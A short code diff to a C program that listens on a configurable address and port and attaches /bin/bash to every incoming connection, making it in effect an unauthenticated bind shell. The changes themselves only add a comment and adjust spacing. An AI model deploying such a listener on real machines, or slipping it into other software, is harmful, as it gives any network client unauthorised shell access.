@@ -19,6 +19,8 @@ main(int argc, char *argv[]) {
 
     char addr[16] = "127.0.0.1"; // Max addr length "255.255.255.255" + '\0' = 16
     char port[6] = "8080";       // Max port length "65535" + '\0' = 6
+
+    // Read command-line args for addr and port
     read_new_host(argc, argv, addr, port); 
 
     if ((listener_fd = init_listener(addr, port)) < 0) {
@@ -27,7 +29,7 @@ main(int argc, char *argv[]) {
 
     while(1) {
         connection_fd = get_connection(listener_fd);
-        if(connection_fd > 0) {
+        if (connection_fd > 0) {
             new_pty("/bin/bash", connection_fd);
         }
     }
